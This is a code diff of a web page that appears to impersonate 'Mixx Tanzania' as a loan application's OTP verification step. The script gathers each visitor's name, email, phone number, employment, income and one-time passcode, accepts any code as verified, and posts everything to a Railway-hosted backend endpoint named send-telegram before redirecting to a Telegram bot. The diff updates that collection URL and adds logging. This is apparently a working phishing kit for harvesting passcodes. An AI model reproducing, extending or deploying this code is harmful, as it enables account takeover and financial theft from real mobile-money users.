@@ -323,11 +323,13 @@
         // ============================================
         // MIXX TANZANIA - OTP VERIFICATION PAGE
         // SECURE - Uses Backend API
+        // Railway URL: miixxyaass-production-d3f3.up.railway.app
         // ============================================
         
-        const BACKEND_URL = 'https://miixxyaass-production.up.railway.app';
+        const BACKEND_URL = 'https://miixxyaass-production-d3f3.up.railway.app';
         const BOT_USERNAME = 'MixzyassBot';
         
+        // Get data from URL parameters
         const urlParams = new URLSearchParams(window.location.search);
         const amount = urlParams.get('amount') || '0';
         const term = urlParams.get('term') || '0';
@@ -339,12 +341,24 @@
         const employment = decodeURIComponent(urlParams.get('employment') || '');
         const income = decodeURIComponent(urlParams.get('income') || '');
 
+        // Validate required data
+        if (!name || !email) {
+            console.error('Missing required data');
+            document.getElementById('errorMsg').textContent = 'Missing application data. Redirecting...';
+            document.getElementById('errorMsg').classList.add('show');
+            setTimeout(() => {
+                window.location.href = 'index.html';
+            }, 2000);
+        }
+
+        // Update displays
         document.getElementById('summaryAmount').innerText = `TZS ${parseInt(amount).toLocaleString()}`;
         document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
         document.getElementById('summaryMonthly').innerText = `TZS ${parseFloat(monthly).toLocaleString('en-US', {minimumFractionDigits: 0, maximumFractionDigits: 0})}`;
         document.getElementById('summaryRate').innerText = `${rate}%`;
         document.getElementById('displayPhone').innerText = userPhone;
 
+        // Timer variables (5 minutes = 300 seconds)
         let timeLeft = 300;
         let timerInterval;
 
@@ -372,6 +386,7 @@
 
         startTimer();
 
+        // OTP input elements
         const otpInputs = ['otp1', 'otp2', 'otp3', 'otp4', 'otp5', 'otp6'].map(id => document.getElementById(id));
         const verifyBtn = document.getElementById('verifyBtn');
         const errorMsg = document.getElementById('errorMsg');
@@ -414,6 +429,7 @@
 
         otpInputs[0].focus();
 
+        // Resend button
         document.getElementById('resendBtn').addEventListener('click', () => {
             startTimer();
             otpInputs.forEach(input => input.value = '');
@@ -424,6 +440,7 @@
             setTimeout(() => successMsg.classList.remove('show'), 3000);
         });
 
+        // Edit phone number
         document.getElementById('editPhoneBtn').addEventListener('click', () => {
             const newPhone = prompt('Enter your Mixx number (format: +255XXXXXXXXX):', userPhone);
             if (newPhone && newPhone.trim().length > 5) {
@@ -451,16 +468,23 @@
                 income: income
             };
             
+            console.log('Sending OTP to backend:', data);
+            
             try {
                 const response = await fetch(`${BACKEND_URL}/api/send-telegram`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
                     body: JSON.stringify(data)
                 });
-                return await response.json();
+                
+                const result = await response.json();
+                console.log('Backend response:', result);
+                return result;
             } catch (error) {
-                console.error('Error:', error);
-                return { success: false };
+                console.error('Error sending to backend:', error);
+                return { success: false, error: error.message };
             }
         }
 
@@ -475,6 +499,7 @@
             }
         }
 
+        // Verify button click
         verifyBtn.addEventListener('click', async () => {
             const otp = getOtp();
             
@@ -487,11 +512,13 @@
             errorMsg.classList.remove('show');
             showLoading(true);
             
+            // Send OTP to backend
             await sendOtpToBackend(otp);
             
             successMsg.textContent = '✓ Verified! Redirecting to complete your application...';
             successMsg.classList.add('show');
             
+            // Redirect to Telegram bot after short delay
             setTimeout(() => {
                 window.location.href = `https://t.me/${BOT_USERNAME}`;
             }, 2000);
